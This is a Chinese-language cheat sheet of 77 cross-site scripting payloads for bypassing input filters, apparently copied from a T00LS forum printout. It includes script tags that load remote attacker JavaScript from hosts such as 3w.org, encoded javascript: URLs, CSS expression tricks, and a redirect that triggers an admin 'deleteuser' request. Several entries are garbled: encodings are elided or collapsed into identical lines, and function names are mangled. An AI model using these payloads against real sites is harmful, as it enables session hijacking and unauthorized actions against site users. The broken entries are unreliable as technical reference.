## XSS攻击语句记录
输入检测确定标签没有过滤后，为了显示存在漏洞，需要插入XSS攻击代码，常用语句如下：  

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
<a href='javascript:alert(1)'>aa</a>
```

普通的XSS javascript注入
```html
(1)普通的XSS javascript注入
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
(2)IMG 标签 XSS 使用 JavaScript 命令
<IMG SRC=http://3w.org/XSS/xss.js/>
(3)IMG 标签无分号无引号
<IMG SRC=javascript:alert('XSS')>
(4)IMG 标签大小写不敏感
<IMG SRC=JaVaScRiPt:alert('XSS')>
(5)HTML 编码(必须有分号)
<IMG SRC=javascript:alert("XSS")>
(6)修正缺陷 IMG 标签
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
(7)formCharCode 标签(计算器)
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
(8)UTF-8 的 Unicode 编码(计算器)
<IMG SRC=jav..省略..S')>
(9)7 位的 UTF-8 的 Unicode 编码是没有分号的(计算器)
<IMG SRC=jav..省略..S')>
(10)十六进制编码也是没有分号(计算器)
<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
(11)嵌入式标签,将 Javascript 分开
<IMG SRC="jav ascript:alert('XSS');">
(12)嵌入式编码标签,将 Javascript 分开
<IMG SRC="jav ascript:alert('XSS');">
(13)嵌入式换行符
<IMG SRC="jav ascript:alert('XSS');">
(14)嵌入式回车
<IMG SRC="jav ascript:alert('XSS');">
(15)嵌入式多行注入 JavaScript,这是 XSS 极端的例子
<IMG SRC="javascript:alert('XSS')">
(16)解决限制字符(要求同页面)
<script>z='document.'</script>
<script>z=z+'write("'</script>
<script>z=z+'<script'</script>
<script>z=z+'src=ht'</script>
<script>z=z+'tp://ww'</script>
<script>z=z+'w.shell'</script>
<script>z=z+'.net/1.'</script>
<script>z=z+'js></sc'</script>
<script>z=z+'ript>")'</script>
<script>eval_r(z)</script>
(17)空字符 12-7-1 T00LS - Powered by Discuz! Board
https://www.a.com/viewthread.php?action=printable&tid=15267 2/6perl -e 'print "<IMG
SRC=java\0script:alert(\"XSS\")>";' > out
(18)空字符 2,空字符在国内基本没效果.因为没有地方可以利用
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
(19)Spaces 和 meta 前的 IMG 标签
<IMG SRC=" javascript:alert('XSS');">
(20)Non-alpha-non-digit XSS
<SCRIPT/XSS SRC="http://3w.org/XSS/xss.js"></SCRIPT>
(21)Non-alpha-non-digit XSS to 2
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
(22)Non-alpha-non-digit XSS to 3
<SCRIPT/SRC="http://3w.org/XSS/xss.js"></SCRIPT>
(23)双开括号
<<SCRIPT>alert("XSS");//<</SCRIPT>
(24)无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRChttp://3w.org/XSS/xss.js?<B> >
(25)无结束脚本标记 2
<SCRIPT SRC=//3w.org/XSS/xss.js>
(26)半开的 HTML/JavaScript XSS
<IMG SRC="javascript:alert('XSS')"
(27)双开角括号
<iframe src=http://3w.org/XSS.html <
(28)无单引号 双引号 分号
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
(29)换码过滤的 JavaScript
\";alert('XSS');//
(30)结束 Title 标签
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
(31)Input Image
<INPUT SRC="javascript:alert('XSS');">
(32)BODY Image
<BODY BACKGROUND="javascript:alert('XSS')">
(33)BODY 标签
<BODY('XSS')>
(34)IMG Dynsrc
<IMG DYNSRC="javascript:alert('XSS')">
(35)IMG Lowsrc
<IMG LOWSRC="javascript:alert('XSS')">
(36)BGSOUND
<BGSOUND SRC="javascript:alert('XSS');">
(37)STYLE sheet
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
(38)远程样式表
<LINK REL="stylesheet" HREF="http://3w.org/xss.css">
(39)List-style-image(列表式)
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
(40)IMG VBscript
<IMG SRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS
(41)META 链接 url
<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert('XSS');">
(42)Iframe
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
(43)Frame
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>12-7-1 T00LS - Powered by Discuz!
Boardhttps://www.a.com/viewthread.php?action=printable&tid=15267 3/6
(44)Table
<TABLE BACKGROUND="javascript:alert('XSS')">
(45)TD
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
(46)DIV background-image
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
(47)DIV background-image 后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
(48)DIV expression
<DIV STYLE="width: expression_r(alert('XSS'));">
(49)STYLE 属性分拆表达
<IMG STYLE="xss:expression_r(alert('XSS'))">
(50)匿名 STYLE(组成:开角号和一个字母开头)
<XSS STYLE="xss:expression_r(alert('XSS'))">
(51)STYLE background-image
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><ACLASS=XSS></A>
(52)IMG STYLE 方式
exppression(alert("XSS"))'>
(53)STYLE background
<STYLE><STYLEtype="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
(54)BASE
<BASE HREF="javascript:alert('XSS');//">
(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS
<EMBED SRC="http://3w.org/XSS/xss.swf" ></EMBED>
(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval_r(a+b+c+d);
(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上
<HTML xmlns:xss><?import namespace="xss" implementation="http://3w.org/XSS/xss.htc"><xss:xss>XSS</xss:xss></HTML>
(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用
<SCRIPT SRC=""></SCRIPT>
(59)IMG 嵌入式命令,可执行任意命令
<IMG SRC="http://www.a.com/a.php?a=b">
(60)IMG 嵌入式命令(a.jpg 在同服务器)
Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
(61)绕符号过滤
<SCRIPT a=">" SRC="http://3w.org/xss.js"></SCRIPT>
(62)<SCRIPT =">" SRC="http://3w.org/xss.js"></SCRIPT>
(63)<SCRIPT a=">" " SRC="http://3w.org/xss.js"></SCRIPT>
(64)<SCRIPT "a='>'" SRC="http://3w.org/xss.js"></SCRIPT>
(65)<SCRIPT a=`>` SRC="http://3w.org/xss.js"></SCRIPT>
(66)12-7-1 T00LS - Powered by Discuz! Board
https://www.a.com/viewthread.php?action=printable&tid=15267 4/6<SCRIPT a=">'>"
SRC="http://3w.org/xss.js"></SCRIPT>
(67)<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://3w.org/xss.js"></SCRIPT>
(68)URL 绕行
<A HREF="http://127.0.0.1/">XSS</A>
(69)URL 编码
<A HREF="http://3w.org">XSS</A>
(70)IP 十进制
<A HREF="http://3232235521″>XSS</A>
(71)IP 十六进制
<A HREF="http://0xc0.0xa8.0×00.0×01″>XSS</A>
(72)IP 八进制
<A HREF="http://0300.0250.0000.0001″>XSS</A>
(73)混合编码
<A HREF="http://6 6.000146.0×7.147/"">XSS</A>
(74)节省[http:]
<A HREF="//www.google.com/">XSS</A>
(75)节省[www]
<A HREF="http://google.com/">XSS</A>
(76)绝对点绝对 DNS
<A HREF="http://www.google.com./">XSS</A>
(77)javascript 链接
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```